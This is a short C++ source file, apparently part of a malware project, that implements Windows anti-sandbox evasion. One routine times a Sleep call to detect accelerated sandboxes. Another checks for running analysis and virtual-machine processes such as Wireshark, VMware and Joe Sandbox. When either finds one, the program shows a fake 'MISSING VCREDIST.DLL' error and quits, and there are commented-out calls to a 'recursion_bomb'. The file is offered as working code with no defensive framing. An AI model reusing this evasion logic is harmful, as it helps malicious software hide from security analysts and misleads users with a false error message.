#include <chrono>

void antiSleep()
{
    auto startTime = std::chrono::high_resolution_clock::now();
	Sleep(5000);
	auto endTime = std::chrono::high_resolution_clock::now();

	double elapsed = std::chrono::duration<double, std::milli>(endTime - startTime).count();

    printf("%f\n", elapsed);

    if (elapsed < 5000)
    {
        // recursion_bomb(100000);
		MessageBoxA(NULL, "MISSING VCREDIST.DLL", "ERROR", MB_ICONWARNING | MB_OK);
		exit(1);
    }
}

void auditProcesses()
{
	LPCWCHAR susProcs[] = { L"joeboxserver.exe", L"Wireshark.exe",  L"vmware.exe", L"vmsrvc.exe", L"prl_cc.exe"};


	for (int i = 0; i < sizeof(susProcs)/sizeof(LPCWCHAR); i++)
	{
		wprintf(L"%s\n", susProcs[i]);
		if (getPidByName(susProcs[i]) != -1)
		{
			// recursion_bomb(10000000);
			MessageBoxA(NULL, "MISSING VCREDIST.DLL", "ERROR", MB_ICONWARNING | MB_OK);
			exit(1);
		}
	}
}

void antiSandbox() 
{
	antiSleep();
	auditProcesses();
}